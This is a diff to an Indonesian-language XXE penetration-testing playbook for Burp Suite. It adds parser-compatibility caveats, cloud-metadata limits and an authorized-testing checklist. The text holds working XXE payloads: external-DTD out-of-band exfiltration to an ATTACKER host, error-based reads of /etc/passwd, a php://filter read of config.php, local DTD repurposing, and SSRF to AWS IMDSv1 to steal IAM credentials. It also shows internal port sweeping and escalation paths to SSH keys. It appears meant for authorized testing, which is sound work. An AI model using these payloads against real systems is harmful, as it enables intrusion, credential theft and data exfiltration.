@@ -567,13 +1180,31 @@ sed -i 's|file:///etc/hostname|php://filter/convert.base64-encode/resource=/var/
 
 Kirim ulang payload di Repeater dan observe terminal callback.
 
+> **⚠️ Jika OOB connectivity berhasil tapi file exfil gagal atau data tidak muncul di callback:** Kemungkinan penyebab (bersifat parser/environment-dependent — tidak selalu sama):
+> 
+> - File mengandung newline → di-encode ke `%0A` → URL menjadi invalid atau truncated
+> - File mengandung `<`, `>`, `&` → break XML parsing sebelum data sampai ke OOB
+> - File terlalu besar → URL di-truncate oleh parser atau network layer
+> - URI encoding constraint di parser mempengaruhi transport
+> - File tidak readable oleh server process (permission issue)
+> 
+> **Solusi kandidat:** gunakan `php://filter/convert.base64-encode` (PHP-specific) untuk encoding yang aman, atau test dulu dengan `/etc/hostname` (pendek, plain) sebelum mencoba file yang lebih kompleks.
+
 > **Mengapa `&#x25;` di xxe.dtd?** Parameter entity tidak bisa di-nest langsung di Internal DTD Subset. `&#x25;` adalah HTML entity untuk `%`, memungkinkan deklarasi nested entity. Lihat [Technical Reference: Parameter Entity Rules](#parameter-entity-rules--trick).
 
 ---
 
-### Langkah 3.4 — Blind XXE via Error Messages (No Outbound)
+### Langkah 3.4 — Blind XXE via Error Messages `[Parser-specific: libxml2/PHP]`
 
 **Gunakan jika:** tidak bisa outbound tapi ada **error message terlihat di response**.
+
+> **Parser-specific:** Teknik ini menggunakan konstruksi `&#x25;` (encoded `%`) di dalam internal DTD subset — ini adalah ekstensi libxml2, bukan XML spec-defined behavior. Bekerja di libxml2 (PHP/Linux). Java Xerces dan .NET kemungkinan menolak konstruksi ini. **Urutan yang benar:** coba **Langkah 3.5 (Local DTD Repurpose) / Fase 6 terlebih dahulu** — parser-agnostic. Gunakan teknik ini hanya jika local DTD tidak tersedia DAN parser/version sudah diverifikasi sebagai libxml2/PHP. Kegagalan teknik ini di parser selain libxml2 bukan false negative.
+
+**Evaluasi kondisi sebelum testing:**
+
+1. Error message dari parser terlihat di response body (4xx/5xx)?
+2. Parser kemungkinan libxml2/PHP environment?
+3. Attacker-controlled data berpotensi sampai ke error path?
 
 **Di Burp Suite → Repeater:**
 
@@ -687,8 +1318,10 @@ HTTP/1.1 200 OK
 ```text
 1. Di Repeater → klik kanan → Send to Intruder
 2. Tab Positions → highlight PORT: "http://127.0.0.1:§8080§/"
-3. Tab Payloads → Numbers: 1-65535 (atau common port list)
-4. Start Attack → sort by Response Length → panjang berbeda = port open
+3. Tab Payloads → Common ports list dahulu (sesuai objective dan scope):
+   80, 443, 8080, 8000, 8443, 3000, 6379, 27017, 9200, 3306, 5432
+   Expand ke range lebih luas hanya jika rules of engagement mengizinkan.
+4. Start Attack → sort by Response Length → panjang berbeda = kandidat port open
 ```
 
 **Common internal ports:**
@@ -702,19 +1335,33 @@ HTTP/1.1 200 OK
 5432                          → PostgreSQL
 ```
 
-**Response indicators:**
+**Response indicators** (interpretasi bersifat inferential — parser & network dependent):
 
 ```text
-HTML/JSON content   → port open, ada service
-"connection refused" → port closed
-timeout             → port filtered
+HTML/JSON content   → port open, ada service [HIGH CONFIDENCE]
+parser error detail → port open tapi tidak return konten [MEDIUM CONFIDENCE]
+"connection refused" → port kemungkinan closed [LOW CONFIDENCE — bisa juga parser error format, jangan rely satu indikator]
+timeout             → port kemungkinan filtered [LOW CONFIDENCE — bisa juga slow service atau parser timeout behavior]
 ```
+
+> ⚠️ SSRF detection dari XXE bersifat indirect dan parser-dependent. Perhatikan kombinasi: status code, body length, timing, dan content. Satu indikator tidak cukup untuk konfirmasi port status.
 
 ---
 
-### Langkah 4.2 — AWS Cloud Metadata
+### Langkah 4.2 — Cloud Metadata via XXE
 
-**Di Burp Repeater:**
+> **Evaluate dulu — required request semantics per cloud provider:**
+> 
+> |Provider|Interface|XXE Compatible?|
+> |---|---|---|
+> |AWS IMDSv1|GET, no required header|✅ Yes|
+> |AWS IMDSv2|PUT + `X-aws-ec2-metadata-token-ttl-seconds`|❌ No (PUT required)|
+> |GCP|GET + `Metadata-Flavor: Google` header|❌ No (header required)|
+> |Azure|GET + `Metadata: true` header|❌ No (header required)|
+> 
+> Jika provider membutuhkan header khusus yang tidak bisa dikirim via XXE GET, document limitation ini — jangan mengklaim dapat diakses tanpa verifikasi.
+
+**AWS IMDSv1 — test jika target di AWS (Di Burp Repeater):**
 
 ```http
 POST /product/stock HTTP/1.1
@@ -731,7 +1378,7 @@ Content-Type: application/xml
 </stockCheck>
 ```
 
-**OUTPUT BERHASIL ✅ — Metadata accessible:**
+**OUTPUT BERHASIL ✅ — IMDSv1 accessible:**
 
 ```http
 HTTP/1.1 200 OK
@@ -750,9 +1397,14 @@ Dapat role name → ambil credentials:
 <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">
 ```
 
-> **AWS IMDSv2:** Butuh PUT request dengan header token — tidak bisa via XXE karena parser hanya GET.
-> 
-> **GCP:** `http://metadata.google.internal/computeMetadata/v1/`
+**OUTPUT GAGAL ❌ — Timeout / 401 / empty:**
+
+```text
+AWS IMDSv2 aktif  → PUT + header token required → tidak bisa via XXE GET
+                    Document sebagai limitation di report
+GCP target        → Metadata-Flavor: Google header required → tidak via bare XXE GET
+Azure target      → Metadata: true header required → tidak via bare XXE GET
+```
 
 ---
 
@@ -761,6 +1413,13 @@ Dapat role name → ambil credentials:
 ## FASE 5: XXE via File Upload
 
 ## ══════════════════════════════════════
+
+> **Prerequisite — verifikasi server-side XML parsing:** Apakah server melakukan server-side parsing, conversion, atau preview terhadap file yang di-upload?
+> 
+> - **YES** → evidence: preview URL, thumbnail, conversion output, atau parser error dari server
+> - **NO** → file hanya disimpan / dikirim ke browser → **bukan attack surface XXE via upload**
+> 
+> File format yang mengandung XML (SVG, DOCX, XLSX, ODT) tidak otomatis berarti XXE possible. Yang menentukan adalah apakah ada server-side XML processing — bukan format file-nya. Cari endpoint conversion, thumbnail generator, atau document preview API terlebih dahulu.
 
 ### Fase 5A — SVG Upload (Burp Suite)
 
@@ -875,9 +1534,11 @@ curl -i \
 
 > **Kondisi yang harus terpenuhi:**
 > 
-> 1. Aplikasi ekstrak dan proses XML dari DOCX
+> 1. Server melakukan server-side XML parsing / extraction dari DOCX (bukan hanya storage)
 > 2. Parser tidak disable external entities
-> 3. Ada observable response (file preview, conversion result, atau error) Banyak library modern (python-docx, Apache POI baru) sudah disable external entities by default.
+> 3. Ada observable response (file preview, conversion result, atau error)
+> 
+> Banyak library modern (python-docx, Apache POI baru) sudah disable external entities by default. Tidak ada bypass jika library sudah hardened.
 
 ---
 
@@ -887,7 +1548,7 @@ curl -i \
 
 ## ══════════════════════════════════════
 
-> **Gunakan jika:** tidak ada outbound HTTP sama sekali, ada error message terlihat, dan local DTD exist di server. Teknik ini tidak butuh koneksi keluar sama sekali.
+> **Gunakan jika:** tidak ada outbound HTTP sama sekali, ada error message terlihat di response, dan local DTD tersedia di server (environment-dependent — tidak dijamin). Teknik ini tidak butuh koneksi keluar sama sekali. Jika local DTD tidak ditemukan di semua candidate paths → teknik ini tidak tersedia di environment ini.
 
 ### Langkah 6.1 — Temukan Local DTD
 
@@ -917,20 +1578,22 @@ HTTP/1.1 400 Bad Request
 
 ➡️ DTD ditemukan! Entity `ISOamso` ada di dalamnya → gunakan entity ini di Langkah 6.2.
 
-**Common local DTD paths — test satu per satu:**
+**Common local DTD candidate paths** (environment-dependent — availability tidak dijamin):
 
 ```text
-Linux (GNOME/Ubuntu/Debian):
-/usr/share/yelp/dtd/docbookx.dtd           ← paling umum (entity: ISOamso)
+Linux (GNOME/Ubuntu/Debian) — tergantung distro & installed packages:
+/usr/share/yelp/dtd/docbookx.dtd           (contoh entity: ISOamso — bergantung versi DTD)
 /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
 /usr/share/sgml/docbook/sgml-dtd-4.2-*/docbook.dtd
 /usr/share/docbook-utils/sgml/docbook/dtd/docbook.dtd
 /usr/share/sgml/html/4.01/dtd/html401.dtd
 
-Windows:
+Windows — tergantung installed software:
 C:\Windows\System32\wbem\cimwin32.dtd
 C:\Program Files\Common Files\Microsoft Shared\...
 ```
+
+> Path availability, entity names, dan DTD version bergantung pada distro, OS version, dan installed packages. Entity name `ISOamso` adalah contoh dari `docbookx.dtd` — DTD lain menggunakan entity name yang berbeda. Jika semua path gagal → teknik ini tidak tersedia di environment ini.
 
 ---
 
@@ -1145,7 +1808,10 @@ File `xxe.dtd` di server attacker:
 &#x27; = ' (single quote)
 ```
 
-Pattern ini kompatibel dengan Java (SAX/DOM), libxml2, dan PHP.
+**Compatibility notes:**
+
+- **External DTD** (file `xxe.dtd` di attacker server) dengan `%eval;`/`%send;`: kompatibel dengan libxml2, Java Xerces, PHP, dan mayoritas parser lain.
+- **Internal DTD `&#x25;` trick** (digunakan di Langkah 3.4): **parser-specific — bukan XML-standard behavior**. Bekerja di libxml2 (PHP/Linux) sebagai ekstensi non-spec. Java Xerces dan .NET mengikuti XML spec lebih ketat → kemungkinan menolak konstruksi ini. **Urutan yang benar jika no outbound + error visible:** (1) coba Local DTD Repurpose (Langkah 3.5/Fase 6) terlebih dahulu — parser-agnostic; (2) gunakan Langkah 3.4 hanya jika local DTD tidak tersedia DAN parser/version sudah diverifikasi sebagai libxml2/PHP. Kegagalan Langkah 3.4 di parser selain libxml2 **bukan false negative** — itu adalah limitasi teknik ini, bukan indikasi target tidak vulnerable.
 
 ---
 
@@ -1194,8 +1860,11 @@ XXE + SSRF → Internal Admin Access
 XXE + SSH Key
     file:///home/user/.ssh/id_rsa → direct SSH access
 
-XXE + AWS Metadata
-    http://169.254.169.254/... → IAM credentials → AWS CLI access
+XXE + AWS Metadata (IMDSv1 — if enabled, jika instance memiliki IAM role ter-attach)
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/ → role name
+    → credentials (access key + secret + token) jika role ter-attach ada
+    [IMDSv2 membutuhkan PUT + token header — tidak via XXE GET]
+    [GCP/Azure membutuhkan custom header — tidak via bare XXE GET]
 ```
 
 ---
@@ -1444,6 +2113,14 @@ mkdir -p ~/xxe_loot/dtd && cd ~/xxe_loot/dtd
 
 **Step 4 — Blind XXE (jika output tidak terlihat):**
 
+Pilih path sesuai kondisi environment:
+
+- OOB HTTP available → Path A (External DTD via OOB) di bawah
+- No outbound, error visible → TREE 7 (Local DTD Repurpose) terlebih dahulu; jika tidak ada local DTD & parser verified libxml2/PHP → TREE 4 LANGKAH C [parser-specific]
+- No outbound, no error → tidak ada observable channel → reassess attack surface
+
+**Path A: External DTD via OOB (jika outbound HTTP tersedia):**
+
 ```bash
 # Terminal 1
 cat > ~/xxe_loot/dtd/xxe.dtd << 'EOF'
@@ -1508,7 +2185,7 @@ Payload di Repeater:
 <!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
 <root><data>test</data></root>
 
-<!-- Error-Based (no outbound) -->
+<!-- Error-Based (no outbound) — [Parser-specific: libxml2/PHP; &#x25; nesting dalam Internal DTD adalah ekstensi non-spec. Java Xerces/.NET kemungkinan menolak. Jika gagal → gunakan External DTD atau Local DTD Repurpose] -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -1524,14 +2201,14 @@ Payload di Repeater:
     <xi:include parse="text" href="file:///etc/passwd"/>
 </root>
 
-<!-- PHP Wrapper (base64) -->
+<!-- PHP Wrapper (base64) — [PHP-specific: requires PHP stream wrapper] -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
 ]>
 <root><data>&xxe;</data></root>
 
-<!-- Repurposing Local DTD -->
+<!-- Repurposing Local DTD — [Environment-dependent: path & entity name bergantung distro, OS version, dan installed packages. 'ISOamso' adalah contoh dari docbookx.dtd; DTD lain menggunakan entity name berbeda. Verifikasi path dan entity yang tersedia sebelum exploit — lihat Fase 6] -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
@@ -1564,10 +2241,10 @@ Payload di Repeater:
 |`DOCTYPE is disallowed`|Parser menolak DTD|Coba XInclude (Fase 1.4). Jika blocked juga → file upload path|
 |Entity literal muncul (`&test;`)|Entity processing disabled|Bedakan dulu: cek apakah DOCTYPE diproses sama sekali|
 |`Permission denied` membaca file|Process tidak punya permission|Coba `/etc/hostname`, `/etc/hosts`, `/proc/version` dulu|
-|File muncul tapi XML rusak/kosong|File mengandung `<`, `>`, `&`|Gunakan `php://filter/convert.base64-encode`|
+|File muncul tapi XML rusak/kosong|File mengandung `<`, `>`, `&`|Gunakan `php://filter/convert.base64-encode` [PHP-specific]; di non-PHP server coba OOB via External DTD|
 |DTD request masuk, tidak ada data callback|Parameter entity nesting restricted di parser ini|Pastikan nesting via External DTD, bukan Internal DTD|
 |OOB callback tidak sampai (HTTP)|Egress firewall|Coba DNS callback via Burp Collaborator atau interactsh|
-|OOB DNS juga tidak sampai|Strict egress filtering|Gunakan Error-Based (3.4) atau Local DTD repurpose (Fase 6)|
+|OOB DNS juga tidak sampai|Strict egress filtering|Coba Local DTD repurpose (Fase 6) terlebih dahulu [parser-agnostic]; jika local DTD tidak tersedia dan parser verified libxml2/PHP → Error-Based (3.4) [parser-specific]|
 |SVG upload ditolak|Extension/MIME validation|Coba ubah `Content-Type: image/svg+xml` di Burp Repeater|
 |SVG diterima tapi tidak trigger XXE|Server tidak proses XML server-side (hanya kirim ke browser)|Cari server-side conversion endpoint (thumbnail generator, preview API)|
 |DOCX tidak trigger XXE|Library Office modern sudah disable external entities|Cek versi library — tidak bisa di-bypass jika hardened|
@@ -1575,8 +2252,8 @@ Payload di Repeater:
 |Error-based tidak menampilkan data|Parser tidak verbose di error|Parser mungkin strip error detail — coba OOB approach|
 |Local DTD path tidak ada|Server pakai distro berbeda|Enumerate path lain di common paths list (Fase 6.1)|
 |`ISOamso` entity tidak ada|Versi DTD berbeda|Baca isi DTD yang ditemukan untuk cari entity yang bisa di-override|
-|AWS metadata 401|IMDSv2 aktif|Tidak bisa via XXE (butuh PUT + header token)|
-|Port sweep tidak memberi hasil jelas|Error/timing seragam|Bandingkan response length, bukan hanya status code|
+|AWS metadata 401/timeout|IMDSv2 aktif; atau GCP/Azure (custom header required)|AWS IMDSv2: butuh PUT + token — tidak via XXE GET. GCP: butuh Metadata-Flavor: Google header. Azure: butuh Metadata: true header. Document sebagai limitation di report.|
+|Port sweep tidak memberi hasil jelas|SSRF detection via XXE bersifat indirect dan parser-dependent|Perhatikan kombinasi: length, status, timing, content — jangan rely pada satu indikator saja|
 |base64 output rusak|Response JSON-encoding whitespace|Copy raw response dari Burp Response tab, strip whitespace sebelum decode|
 |Python server port sudah dipakai|Konflik port|`kill $(lsof -ti:8000)` lalu restart|
 |`SOAP returns 415`|Content-Type salah|Ganti `text/xml` ↔ `application/soap+xml`|
@@ -1600,17 +2277,36 @@ Payload di Repeater:
 [ ] OOB connectivity dikonfirmasi via HTTP (Fase 3.2)
 [ ] External DTD di-setup dan di-test (python3 -m http.server)
 [ ] Blind XXE data exfil dicoba jika direct output tidak ada (Fase 3.3)
-[ ] Error-based dicoba jika no outbound (Fase 3.4)
+[ ] Local DTD repurposing dicoba jika no outbound + error visible (Fase 6) [prioritas sebelum Error-Based]
+[ ] Error-based dicoba jika no outbound + error visible + tidak ada local DTD + parser verified libxml2/PHP (Fase 3.4) [parser-specific — bukan langkah wajib universal]
 [ ] SSRF probe internal services (Fase 4.1 + Burp Intruder port sweep)
 [ ] Cloud metadata dicek jika target di cloud (Fase 4.2)
 [ ] XInclude dicoba jika DOCTYPE diblok (Fase 1.4)
 [ ] SVG upload dicoba jika ada file upload (Fase 5A)
 [ ] DOCX/XLSX dicoba jika ada document upload (Fase 5B)
-[ ] Local DTD repurposing dicoba jika no outbound (Fase 6)
 [ ] SOAP endpoint dikonfirmasi (SOAPAction header ada?)
 [ ] SAML flow dibedakan dari OIDC/OAuth
 [ ] Evidence di Burp Repeater disimpan (klik kanan → Save item)
 [ ] PoC reproducible dan terdokumentasi
+```
+
+---
+
+## ⚠️ Authorized Testing Guardrails
+
+Verifikasi checklist ini sebelum testing dan saat mendokumentasikan findings:
+
+```text
+□ Scope verified — target dalam scope engagement yang disepakati
+□ OOB callback destination authorized (IP/domain listener dalam scope)
+□ Internal network probing diizinkan dalam rules of engagement
+□ Hindari entity expansion destruktif (Billion Laughs) kecuali secara eksplisit disetujui
+□ Hindari retrieval file sensitif yang tidak perlu untuk membuktikan PoC
+□ Cloud metadata testing secara eksplisit diizinkan (termasuk IMDSv1 access)
+□ Define evidence requirements sebelum testing — kapan XXE dianggap "confirmed"
+□ Define stop conditions sebelum eskalasi lebih jauh
+□ Document asumsi parser/version di report findings
+□ Simpan evidence di Burp Repeater history (klik kanan → Save item)
 ```
 
 ---
